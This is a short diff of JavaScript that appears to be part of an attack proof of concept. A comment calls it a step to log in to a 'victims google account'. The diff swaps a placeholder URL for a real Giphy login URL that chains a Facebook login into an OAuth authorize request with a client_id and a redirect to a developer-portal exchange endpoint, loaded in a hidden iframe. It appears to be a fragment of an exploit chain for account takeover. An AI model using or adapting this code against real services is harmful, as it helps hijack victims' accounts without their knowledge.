@@ -2,7 +2,7 @@ document.getElementById('pi').onload = function() {
 
 //second iframe to login to victims google account
  var profileIframe1 = document.createElement('iframe');
- profileIframe1.setAttribute('src', 'https://example.com/login');
+ profileIframe1.setAttribute('src', 'https://giphy.com/login/facebook/?next=/oauth/authorize/%3Fresponse_type%3Dcode%26client_id%3DC7yftGDVCAhmaTnJCKv3eNaRsANYTDDf7PA9jZbw%26redirect_uri%3Dhttps%253A%252F%252Fdevportal-new.giphy.com%252Foauth%252Fexchange%252F');
  profileIframe1.setAttribute('id', 'lo1');
  document.body.appendChild(profileIframe1);
 
